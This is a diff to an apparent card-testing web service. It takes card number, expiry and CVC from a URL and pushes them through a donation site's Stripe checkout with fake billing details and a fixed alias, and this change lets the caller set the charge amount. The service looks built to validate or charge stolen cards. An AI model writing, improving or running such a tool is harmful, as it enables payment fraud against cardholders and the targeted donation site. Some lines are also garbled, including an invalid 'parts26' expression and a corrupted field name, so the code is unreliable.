@@ -23,11 +23,11 @@ def process_credit_card(cc_input):
     return {
         'number': parts[0].strip(),
         'exp_month': parts[1].strip(),
-        'exp_year': parts[2].strip()[-2:], 
+        'exp_year': parts26
         'cvc': parts[3].strip()
     }
 
-def make_donation(cc_input, email, name, amount=0.1):  # Changed default amount to 1
+def make_donation(cc_input, email, name, amount=1):  # Default amount set to 1
     try:
         card_details = process_credit_card(cc_input)
     except ValueError as e:
@@ -57,7 +57,7 @@ def make_donation(cc_input, email, name, amount=0.1):  # Changed default amount 
     stripe_data = {
         'type': 'card',
         'billing_details[address][postal_code]': '91003',
-        'billing_details[address][city]': 'New York',
+        'billing DETAILS[address][city]': 'New York',
         'billing_details[address][country]': 'US',
         'billing_details[address][line1]': 'New York',
         'billing_details[email]': email,
@@ -117,11 +117,11 @@ def make_donation(cc_input, email, name, amount=0.1):  # Changed default amount 
         donation_data = {
             'country': 'us',
             'payment_intent[email]': email,
-            'payment_intent[amount]': str(amount),  # Changed to 1
+            'payment_intent[amount]': str(int(amount * 100)),  # Convert to cents for Stripe
             'payment_intent[currency]': 'usd',
             'payment_intent[payment_method]': payment_method_id,
             'disable_existing_subscription_check': 'false',
-            'donation_form[amount]': str(amount),  # Changed to 1
+            'donation_form[amount]': str(int(amount * 100)),  # Convert to cents for Stripe
             'donation_form[comment]': '',
             'donation_form[display_name]': '',
             'donation_form[email]': email,
@@ -153,7 +153,7 @@ def make_donation(cc_input, email, name, amount=0.1):  # Changed default amount 
         )
         
         if donation_response.status_code == 200:
-            return {"status": "charged", "message": "Donation successful"}
+            return {"status": "charged", "message": f"Donation of ${amount} successful"}
         else:
             try:
                 response_data = donation_response.json()
@@ -165,13 +165,22 @@ def make_donation(cc_input, email, name, amount=0.1):  # Changed default amount 
     except Exception as e:
         return {"status": "declined", "message": f"An error occurred: {str(e)}"}
 
-@app.route('/gateway=stripe5$/key=rocky/cc=<cc>', methods=['GET'])
-def handle_donation(cc):
+@app.route('/gateway=stripeautocharge/key=rocky/amt=<amount>/cc=<cc>', methods=['GET'])
+def handle_donation(amount, cc):
     try:
         # Decode the cc parameter to handle URL-encoded characters
         decoded_cc = unquote(cc)
-        logger.info(f"Received request with cc: {decoded_cc}")
-        result = make_donation(decoded_cc, "darkboy3366@gmail.com", "Dark Boy")
+        # Convert and validate amount
+        try:
+            amount = float(amount)
+            if amount < 0.5:  # Stripe minimum charge is $0.50 USD
+                raise ValueError("Amount must be at least $0.50")
+        except ValueError as e:
+            logger.error(f"Invalid amount: {amount}")
+            return jsonify({"status": "declined", "message": f"Invalid amount: {str(e)}"}), 400
+        
+        logger.info(f"Received request with cc: {decoded_cc}, amount: {amount}")
+        result = make_donation(decoded_cc, "darkboy3366@gmail.com", "Dark Boy", amount)
         return jsonify(result)
     except Exception as e:
         logger.error(f"Server error: {str(e)}")
